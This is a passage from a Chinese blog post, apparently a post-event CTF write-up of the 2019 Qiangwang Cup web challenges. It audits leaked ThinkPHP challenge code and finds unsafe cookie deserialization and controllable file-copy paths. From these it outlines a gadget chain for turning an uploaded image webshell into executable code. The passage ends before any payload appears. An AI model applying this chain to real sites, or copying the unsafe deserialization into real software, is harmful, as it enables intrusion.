@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言由于当时没有报名参加强网杯因此，只能赛后复现一波。 0x01 upload 我们通过dirsearch可以发现源码泄露，下载下来审计。 由于是赛后复现，就没有将源码放上去。首先我们先查看thinkphp的路由信息(html/route/route.php)，关注web模块下的控制器方法。12345678910111213141516171819202122232425262728&amp;lt;?ph">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019强网杯Web部分赛后复现">
+<meta property="og:url" content="http://yoursite.com/2020/01/19/2019强网杯Web部分赛后复现/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言由于当时没有报名参加强网杯因此，只能赛后复现一波。 0x01 upload 我们通过dirsearch可以发现源码泄露，下载下来审计。 由于是赛后复现，就没有将源码放上去。首先我们先查看thinkphp的路由信息(html/route/route.php)，关注web模块下的控制器方法。12345678910111213141516171819202122232425262728&amp;lt;?ph">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-upload-1.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-upload-2.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-upload-3.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-supersqli-1.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-supersqli-2.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-supersqli-3.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-supersqli-4.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-supersqli-6.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-supersqli-7.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-supersqli-8.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-supersqli-9.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-smarthacker-1.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-smarthacker-2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-smarthacker-3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-smarthacker-4.png">
+<meta property="og:updated_time" content="2020-01-19T08:23:09.583Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019强网杯Web部分赛后复现">
+<meta name="twitter:description" content="前言由于当时没有报名参加强网杯因此，只能赛后复现一波。 0x01 upload 我们通过dirsearch可以发现源码泄露，下载下来审计。 由于是赛后复现，就没有将源码放上去。首先我们先查看thinkphp的路由信息(html/route/route.php)，关注web模块下的控制器方法。12345678910111213141516171819202122232425262728&amp;lt;?ph">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-upload-1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/01/19/2019强网杯Web部分赛后复现/">
+
+
+
+
+
+  <title>2019强网杯Web部分赛后复现 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/19/2019强网杯Web部分赛后复现/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2019强网杯Web部分赛后复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-19T16:21:47+08:00">
+                2020-01-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  12
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>由于当时没有报名参加强网杯因此，只能赛后复现一波。</p>
+<h5 id="0x01-upload"><a href="#0x01-upload" class="headerlink" title="0x01 upload"></a>0x01 upload</h5><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-upload-1.PNG" alt></p>
+<h6 id="我们通过dirsearch可以发现源码泄露，下载下来审计。"><a href="#我们通过dirsearch可以发现源码泄露，下载下来审计。" class="headerlink" title="我们通过dirsearch可以发现源码泄露，下载下来审计。"></a>我们通过dirsearch可以发现源码泄露，下载下来审计。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2019-qwb-upload-2.PNG" alt></p>
+<h6 id="由于是赛后复现，就没有将源码放上去。"><a href="#由于是赛后复现，就没有将源码放上去。" class="headerlink" title="由于是赛后复现，就没有将源码放上去。"></a>由于是赛后复现，就没有将源码放上去。</h6><h6 id="首先我们先查看thinkphp的路由信息-html-route-route-php-，关注web模块下的控制器方法。"><a href="#首先我们先查看thinkphp的路由信息-html-route-route-php-，关注web模块下的控制器方法。" class="headerlink" title="首先我们先查看thinkphp的路由信息(html/route/route.php)，关注web模块下的控制器方法。"></a>首先我们先查看thinkphp的路由信息(<strong>html/route/route.php</strong>)，关注web模块下的控制器方法。</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | ThinkPHP [ WE CAN DO IT JUST THINK ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Copyright (c) 2006~2018 http://thinkphp.cn All rights reserved.</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | Author: liu21st &lt;liu21st@gmail.com&gt;</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">Route::post(<span class="string">"login"</span>,<span class="string">'web/login/login'</span>);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">"index"</span>,<span class="string">'web/index/index'</span>);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">"home"</span>,<span class="string">"web/index/home"</span>);</span><br><span class="line"></span><br><span class="line">Route::post(<span class="string">"register"</span>,<span class="string">"web/register/register"</span>);</span><br><span class="line"></span><br><span class="line">Route::get(<span class="string">"logout"</span>,<span class="string">"web/index/logout"</span>);</span><br><span class="line"></span><br><span class="line">Route::post(<span class="string">"upload"</span>,<span class="string">"web/profile/upload_img"</span>);</span><br><span class="line"></span><br><span class="line">Route::miss(<span class="string">'web/index/index'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line"></span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<h6 id="先看一下html-application-web-controller-Index-php中的代码，我们需要关注的是login-check方法，这个方法从cookie中获取字符串，并将其反序列化。所以我们可以反序列化任意类。"><a href="#先看一下html-application-web-controller-Index-php中的代码，我们需要关注的是login-check方法，这个方法从cookie中获取字符串，并将其反序列化。所以我们可以反序列化任意类。" class="headerlink" title="先看一下html/application/web/controller/Index.php中的代码，我们需要关注的是login_check方法，这个方法从cookie中获取字符串，并将其反序列化。所以我们可以反序列化任意类。"></a>先看一下<code>html/application/web/controller/Index.php</code>中的代码，我们需要关注的是login_check方法，这个方法从cookie中获取字符串，并将其反序列化。所以我们可以反序列化任意类。</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $profile=cookie(<span class="string">'user'</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($profile))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">            <span class="keyword">$this</span>-&gt;profile_db=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,intval(<span class="keyword">$this</span>-&gt;profile[<span class="string">'ID'</span>]))-&gt;find();</span><br><span class="line">            <span class="keyword">if</span>(array_diff(<span class="keyword">$this</span>-&gt;profile_db,<span class="keyword">$this</span>-&gt;profile)==<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="紧接着看html-application-web-controller-Login-php中的代码，Login类里面只有一个login方法，就是常规的登陆检测，没有可利用的地方。再看html-application-web-controller-Profile-php中的代码，在upload-img方法中有上传文件复制操作，而这个操作中的-this-gt-ext-this-gt-filename-tmp-this-gt-filename均可通过反序列化控制。如果我们能调用upload-img这一方法，在知道图片路径的情况下，就可以任意重命名图片文件，可以考虑和图片马相结合。"><a href="#紧接着看html-application-web-controller-Login-php中的代码，Login类里面只有一个login方法，就是常规的登陆检测，没有可利用的地方。再看html-application-web-controller-Profile-php中的代码，在upload-img方法中有上传文件复制操作，而这个操作中的-this-gt-ext-this-gt-filename-tmp-this-gt-filename均可通过反序列化控制。如果我们能调用upload-img这一方法，在知道图片路径的情况下，就可以任意重命名图片文件，可以考虑和图片马相结合。" class="headerlink" title="紧接着看html/application/web/controller/Login.php中的代码，Login类里面只有一个login方法，就是常规的登陆检测，没有可利用的地方。再看html/application/web/controller/Profile.php中的代码，在upload_img方法中有上传文件复制操作，而这个操作中的$this-&gt;ext,$this-&gt;filename_tmp,$this-&gt;filename均可通过反序列化控制。如果我们能调用upload_img这一方法，在知道图片路径的情况下，就可以任意重命名图片文件，可以考虑和图片马相结合。"></a>紧接着看<code>html/application/web/controller/Login.php</code>中的代码，Login类里面只有一个login方法，就是常规的登陆检测，没有可利用的地方。再看<code>html/application/web/controller/Profile.php</code>中的代码，在upload_img方法中有上传文件复制操作，而这个操作中的<code>$this-&gt;ext,$this-&gt;filename_tmp,$this-&gt;filename</code>均可通过反序列化控制。如果我们能调用upload_img这一方法，在知道图片路径的情况下，就可以任意重命名图片文件，可以考虑和图片马相结合。</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="在Profile-php文件末尾还有两个魔术方法，其中-this-gt-except在反序列化时可控，这一就有可能通过call调用任意类方法。继续看Register-php中是否存在可以触发call方法的地方。"><a href="#在Profile-php文件末尾还有两个魔术方法，其中-this-gt-except在反序列化时可控，这一就有可能通过call调用任意类方法。继续看Register-php中是否存在可以触发call方法的地方。" class="headerlink" title="在Profile.php文件末尾还有两个魔术方法，其中$this-&gt;except在反序列化时可控，这一就有可能通过call调用任意类方法。继续看Register.php中是否存在可以触发call方法的地方。"></a>在Profile.php文件末尾还有两个魔术方法，其中$this-&gt;except在反序列化时可控，这一就有可能通过<strong>call调用任意类方法。继续看Register.php中是否存在可以触发</strong>call方法的地方。</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="我们看到html-application-web-controller-Register-php文件中存在destruct，其中-this-gt-registed-this-gt-checker在反序列化时也是可控的。如果我们将-this-gt-checker赋值为Register类，而Register类没有index方法，所以调用的时候就会触发call方法，这样就形成了一条完整的攻击链。"><a href="#我们看到html-application-web-controller-Register-php文件中存在destruct，其中-this-gt-registed-this-gt-checker在反序列化时也是可控的。如果我们将-this-gt-checker赋值为Register类，而Register类没有index方法，所以调用的时候就会触发call方法，这样就形成了一条完整的攻击链。" class="headerlink" title="我们看到html/application/web/controller/Register.php文件中存在destruct，其中$this-&gt;registed,$this-&gt;checker在反序列化时也是可控的。如果我们将$this-&gt;checker赋值为Register类，而Register类没有index方法，所以调用的时候就会触发call方法，这样就形成了一条完整的攻击链。"></a>我们看到<code>html/application/web/controller/Register.php</code>文件中存在<strong>destruct，其中$this-&gt;registed,$this-&gt;checker在反序列化时也是可控的。如果我们将$this-&gt;checker赋值为Register类，而Register类没有index方法，所以调用的时候就会触发</strong>call方法，这样就形成了一条完整的攻击链。</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checker) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/home"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(input(<span class="string">"post.username"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.email"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.password"</span>))) &#123;</span><br><span class="line">            $email = input(<span class="string">"post.email"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span><br><span class="line">            $password = input(<span class="string">"post.password"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span><br><span class="line">            $username = input(<span class="string">"post.username"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check_email($email)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"username"</span>, $username)-&gt;find()) &amp;&amp; <span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"email"</span>, $email)-&gt;find())) &#123;</span><br><span class="line">                    $user_info = [<span class="string">"email"</span> =&gt; $email, <span class="string">"password"</span> =&gt; md5($password), <span class="string">"username"</span> =&gt; $username];</span><br><span class="line">                    <span class="keyword">if</span> (db(<span class="string">"user"</span>)-&gt;insert($user_info)) &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;registed = <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;success(<span class="string">'Registed successful!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;error(<span class="string">'Registed failed!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;error(<span class="string">'Account already exists!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Email illegal!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Something empty!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_email</span><span class="params">($email)</span></span>&#123;</span><br><span class="line">        $pattern = <span class="string">"/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]&#123;2,&#125;)$/"</span>;</span><br><span class="line">        preg_match($pattern, $email, $matches);</span><br><span class="line">        <span 